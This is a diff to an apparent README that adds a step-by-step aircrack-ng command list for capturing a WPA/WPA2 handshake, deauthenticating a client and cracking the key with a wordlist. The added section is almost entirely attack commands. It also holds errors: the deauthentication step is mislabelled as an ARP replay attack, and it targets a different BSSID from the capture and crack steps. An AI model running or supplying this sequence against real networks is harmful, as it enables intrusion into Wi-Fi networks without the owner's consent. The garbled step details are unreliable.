@@ -182,6 +182,29 @@ Transient Key  : 86 D0 43 C9 AA 47 F8 03 2F 71 3F 53 D6 65 F3 F3
 EAPOL HMAC     : 8E 52 1B 51 E8 F2 7E ED 95 F4 CF D2 C6 D0 F0 68
 ```
 
+## List of commands
+Below you can find the list of all of the commands needed to crack a WPA/WPA2 network.
+
+```
+# kill all interfering processes prior to using the aircrack-ng
+airmon-ng check kill
+
+# put your network device into monitor mode
+airmon-ng start wlan0
+
+# listen for all nearby beacon frames to get target BSSID and channel
+airodump-ng mon0
+
+# start listening for the handshake on a new console session
+airodump-ng -c 10 --bssid 08:00:BF:E6:31:2E -w output-file mon0
+
+# start the ARP request replay attack
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+
+# run aircrack-ng to obtain the WPA key
+aircrack-ng -a2 -b 08:00:BF:E6:31:2E -w wordlist.txt output*.cap
+```
+
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
